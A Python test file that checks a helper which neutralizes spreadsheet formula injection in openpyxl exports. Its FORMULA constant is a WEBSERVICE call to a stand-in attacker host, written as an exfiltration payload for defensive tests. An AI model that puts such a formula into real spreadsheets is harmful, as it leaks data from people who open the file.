"""force_text_cells keeps user typed values from becoming live formulas."""

import io
import zipfile

import pytest

from openpyxl import Workbook

from utils.excel import force_text_cells

FORMULA = '=WEBSERVICE("http://attacker.example/leak")'


def saved_sheet_xml(workbook: Workbook) -> str:
    stream = io.BytesIO()
    workbook.save(stream)
    stream.seek(0)
    return zipfile.ZipFile(stream).read("xl/worksheets/sheet1.xml").decode()


def test_openpyxl_stores_a_leading_equals_as_a_formula():
    """The behaviour force_text_cells exists to neutralize."""
    sheet = Workbook().active
    sheet.append([FORMULA])

    assert sheet.cell(row=1, column=1).data_type == "f"


def test_force_text_cells_turns_the_value_into_text():
    sheet = Workbook().active
    sheet.append([FORMULA])
    force_text_cells(sheet, [1])

    assert sheet.cell(row=1, column=1).data_type == "s"
    assert sheet.cell(row=1, column=1).value == FORMULA


def test_the_saved_file_has_no_formula_element():
    workbook = Workbook()
    workbook.active.append([FORMULA])
    force_text_cells(workbook.active, [1])

    xml = saved_sheet_xml(workbook)

    assert "<f>" not in xml
    assert "WEBSERVICE" in xml  # kept as text, not lost


def test_it_only_touches_the_given_columns():
    sheet = Workbook().active
    sheet.append([FORMULA, FORMULA])
    force_text_cells(sheet, [1])

    assert sheet.cell(row=1, column=1).data_type == "s"
    assert sheet.cell(row=1, column=2).data_type == "f"


def test_it_leaves_the_formulas_the_export_generates_alone():
    sheet = Workbook().active
    sheet.append(["=SUM(A1:A2)"])
    force_text_cells(sheet, [2, 3])  # the export never marks its own columns

    assert sheet.cell(row=1, column=1).data_type == "f"


@pytest.mark.parametrize("value", ["SOJA", "+1", "-1", "@user", "", None, 1234])
def test_ordinary_values_are_untouched(value):
    sheet = Workbook().active
    sheet.append([value])
    force_text_cells(sheet, [1])

    assert sheet.cell(row=1, column=1).value == value


def test_it_works_on_the_last_appended_row_only():
    sheet = Workbook().active
    sheet.append([FORMULA])
    sheet.append([FORMULA])
    force_text_cells(sheet, [1])

    assert sheet.cell(row=1, column=1).data_type == "f"
    assert sheet.cell(row=2, column=1).data_type == "s"
